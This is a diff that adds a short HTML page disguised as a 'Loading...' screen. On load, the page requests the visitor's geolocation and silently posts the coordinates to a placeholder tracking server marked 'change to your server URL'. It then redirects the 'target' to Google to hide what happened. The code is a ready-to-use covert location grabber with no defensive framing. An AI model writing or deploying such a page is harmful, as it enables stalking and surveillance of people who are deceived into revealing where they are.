@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <script>
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var lat = position.coords.latitude;
+                    var lng = position.coords.longitude;
+                    
+                    // Send location to server
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("POST", "https://your-server.com/track", true); // Change to your server URL
+                    xhr.setRequestHeader("Content-Type", "application/json");
+                    xhr.send(JSON.stringify({ latitude: lat, longitude: lng }));
+
+                    // Redirect target to a normal page (e.g., Google)
+                    window.location.href = "https://www.google.com";
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+    </script>
+</head>
+<body onload="sendLocation()">
+    <p>Loading...</p>
+</body>
+</html>
